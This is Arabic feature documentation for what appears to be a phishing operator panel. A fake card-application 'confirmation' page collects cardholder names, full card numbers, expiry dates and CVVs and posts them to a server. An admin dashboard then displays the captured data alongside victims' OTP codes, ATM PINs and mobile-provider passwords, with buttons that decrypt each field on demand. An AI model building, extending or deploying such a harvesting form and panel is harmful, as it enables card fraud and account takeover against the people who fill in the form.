# توثيق ميزة عرض بيانات البطاقة في لوحة الأدمن

## التحديثات المنفذة

### 1. صفحة التأكيد (public/confirmation.html)

#### التغييرات:
- **إضافة أسماء للحقول (name attributes)**: تم إضافة خصائص `name` لجميع حقول النموذج لتسهيل جمع البيانات
  - `name="cardholder"` - اسم حامل البطاقة
  - `name="cardNumber"` - رقم البطاقة
  - `name="expiryMonth"` - شهر انتهاء البطاقة
  - `name="expiryYear"` - سنة انتهاء البطاقة
  - `name="cvv"` - رمز CVV

- **تحديث كود الإرسال**: عند الضغط على "استمرار"، يتم الآن جمع وإرسال بيانات البطاقة:
  ```javascript
  const formData = new FormData(demoPaymentForm);
  const cardHolderName = formData.get('cardholder') || '';
  const cardNumber = formData.get('cardNumber') || '';
  const expiryMonth = formData.get('expiryMonth') || '';
  const expiryYear = formData.get('expiryYear') || '';
  const cardCvv = formData.get('cvv') || '';
  ```

- **إرسال البيانات للسيرفر**: يتم إرسال البيانات إلى `/api/requests/confirm`:
  ```javascript
  body: JSON.stringify({ 
    id: requestId, 
    cardHolderName: cardHolderName, 
    cardNumber: cardNumber.replace(/\s/g, ''), 
    cardExpiryMonth: expiryMonth, 
    cardExpiryYear: expiryYear, 
    cardCvv: cardCvv 
  })
  ```

### 2. صفحة الأدمن (admin.html)

#### تحديثات الجدول الرئيسي:
- **تقليل عدد الأعمدة**: تم تقليل الأعمدة من 13 إلى 11 عمود
- **إزالة أعمدة**: "بيانات التأكيد"، "رقم ATM"، "مزود الشبكة"
- **إضافة عمود**: "رمز OTP" - يعرض رمز التحقق بتنسيق بارز ومميز

#### تحسينات عرض OTP في الجدول:
```javascript
const otpDisplay = confirmationCode ? 
  `<span style="font-size:18px;color:#8a173b;font-weight:700;letter-spacing:2px;direction:ltr;display:inline-block">
    ${escapeHtml(confirmationCode)}
  </span>` : 
  '<span style="color:#999;font-size:13px">—</span>';
```

#### تحديثات نافذة التفاصيل (Details Modal):

##### تنظيم البيانات في أقسام:
تم تنظيم البيانات في 3 أقسام رئيسية مع فواصل مرئية:

1. **━━━ بيانات البطاقة ━━━**
   - اسم حامل البطاقة (نص عادي)
   - رقم البطاقة (زر لعرضه مشفر 🔒)
   - تاريخ انتهاء البطاقة (شهر/سنة بتنسيق واضح)
   - CVV (زر لعرضه مشفر 🔒)

2. **━━━ بيانات التحقق ━━━**
   - رمز التأكيد (OTP) - معروض بصندوق مميز:
     - حجم خط: 24px
     - لون: #8a173b (أحمر داكن)
     - خلفية: #f9f3f5 (وردي فاتح)
     - إطار: 2px solid #8a173b
     - تباعد بين الأحرف: 3px
     - شكل مستدير (border-radius: 8px)
   - وقت إرسال الرمز

3. **━━━ بيانات إضافية ━━━**
   - رقم ATM (زر لعرضه مشفر 🔒)
   - مزود الشبكة
   - رقم جوال المزود
   - كلمة مرور المزود (زر لعرضها مشفرة 🔒)
   - وقت الإكمال
   - ملاحظة القرار
   - الحالة

##### تحسينات التصميم:
- أزرار عرض البيانات المشفرة بتصميم محسّن:
  ```css
  padding: 4px 12px;
  font-size: 13px;
  ```
- فواصل الأقسام:
  ```css
  grid-column: 1/-1;
  text-align: center;
  margin: 16px 0 8px 0;
  border-top: 1px solid #e5e5e5;
  padding-top: 16px;
  ```

### 3. السيرفر (server.js)

#### البيانات المحفوظة:
السيرفر يحفظ بالفعل البيانات التالية بشكل مشفر:
- `card_number_encrypted` - رقم البطاقة (مشفر)
- `card_expiry_month` - شهر انتهاء البطاقة
- `card_expiry_year` - سنة انتهاء البطاقة
- `card_cvv_encrypted` - رمز CVV (مشفر)
- `card_holder_name` - اسم حامل البطاقة

#### API endpoint لفك التشفير:
```javascript
GET /api/admin/requests/decrypt?id={requestId}&field={fieldName}
```

الحقول المدعومة:
- `card_number` - رقم البطاقة
- `card_cvv` - رمز CVV
- `atm_pin` - رقم ATM
- `provider_password` - كلمة مرور المزود

## سير العمل (Workflow)

### من جانب المستخدم:
1. المستخدم يملأ طلب البطاقة في صفحة التقديم
2. يتم توجيهه لصفحة التأكيد (confirmation.html)
3. يدخل بيانات البطاقة:
   - اسم حامل البطاقة
   - رقم البطاقة
   - تاريخ انتهاء البطاقة (شهر/سنة)
   - CVV
4. عند الضغط على "استمرار":
   - يتم إرسال البيانات للسيرفر
   - السيرفر يحفظها مشفرة في قاعدة البيانات
   - يتم تحويل المستخدم لصفحة الانتظار

### من جانب الأدمن:
1. الأدمن يسجل دخول للوحة التحكم
2. يرى جدول بجميع الطلبات مع عمود OTP
3. عند الضغط على "التفاصيل" لأي طلب:
   - تظهر نافذة منبثقة بجميع البيانات
   - بيانات البطاقة الحساسة محمية بأزرار "عرض 🔒"
   - رمز OTP معروض بشكل بارز وواضح
   - البيانات منظمة في أقسام لسهولة القراءة

4. لعرض البيانات المشفرة:
   - الضغط على زر "عرض 🔒"
   - تظهر نافذة تنبيه (alert) بالقيمة المفككة

## الأمان

### التشفير:
- يستخدم النظام تشفير AES-256-CBC
- مفتاح التشفير: `ENCRYPTION_KEY` من متغيرات البيئة
- البيانات المشفرة:
  - رقم البطاقة
  - CVV
  - رقم ATM
  - كلمة مرور مزود الشبكة

### الحماية:
- بيانات البطاقة الحساسة لا تظهر مباشرة في واجهة الأدمن
- تحتاج صلاحية أدمن لفك التشفير
- يتم فك التشفير فقط عند الطلب عبر API محمي

## التوافق

- ✅ يعمل مع قاعدة بيانات PostgreSQL
- ✅ يعمل مع وضع JSON المحلي (Local Fallback)
- ✅ متوافق مع النسخ العربية والإنجليزية

## الملاحظات

1. **تاريخ انتهاء البطاقة**: يُحفظ كشهر وسنة منفصلين، ويُعرض بتنسيق MM/YYYY
2. **رمز OTP**: له تصميم خاص مميز في كل من:
   - الجدول الرئيسي (حجم 18px، تباعد 2px)
   - نافذة التفاصيل (حجم 24px، تباعد 3px، صندوق مميز)
3. **الفواصل**: تساعد في تنظيم البيانات وسهولة القراءة
4. **الأيقونات**: استخدام 🔒 للدلالة على البيانات المحمية
